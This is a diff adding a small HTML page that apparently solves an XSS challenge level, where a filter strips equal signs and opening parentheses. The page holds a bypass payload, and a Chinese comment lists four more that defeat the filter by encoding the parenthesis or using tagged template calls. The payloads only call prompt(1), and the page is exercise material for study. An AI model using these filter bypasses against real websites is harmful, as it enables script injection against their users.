@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+</head>
+
+<body>
+    <title></title>
+    <h1></h1>
+    <div id="body">
+    </div>
+    <script>
+        function escape(input) {
+            //                      v-- frowny face
+            // 過濾了左括號,直接用DOM,BOM已經不太可能
+            input = input.replace(/[=(]/g, '');
+
+            // ok seriously, disallows equal signs and open parenthesis
+            return input;
+        }
+        var input = "<svg><script>prompt&#40;1)<b>";
+        var body = document.getElementById("body");
+        body.innerHTML = escape(input);
+    </script>
+</body>
+        <!--多種解法,思路是編碼繞過括號的過濾 
+        // <svg><script>prompt&#40;1)<b>
+        // <svg><script>prompt&#40;1)</script>
+        // <script>eval.call`${'prompt\x281)'}`</script> 
+        // <script>prompt.call`${1}`</script> -->
+</html>
